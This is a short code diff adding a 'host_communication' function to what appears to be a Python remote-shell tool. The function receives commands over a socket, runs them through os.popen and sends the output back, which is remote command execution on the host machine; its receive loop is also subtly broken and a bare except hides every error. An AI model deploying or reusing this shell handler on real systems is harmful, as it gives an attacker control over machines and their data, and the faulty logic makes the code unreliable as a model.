@@ -88,6 +88,22 @@ def client_communication(sock):
             print("[+] Connection failed")
 
 
+def host_communication(sock):
+    while True:
+        try:
+            command = ''
+            while True:
+                recv = sock.recv(1024)
+                if not recv.decode():
+                    break
+            command += recv.decode()
+            if command == 'quit' or command == 'exit':
+                break
+            sock.send(os.popen(command).read().encode())
+        except:
+            pass
+
+
 def main():
     parse_args()
     run_shell()
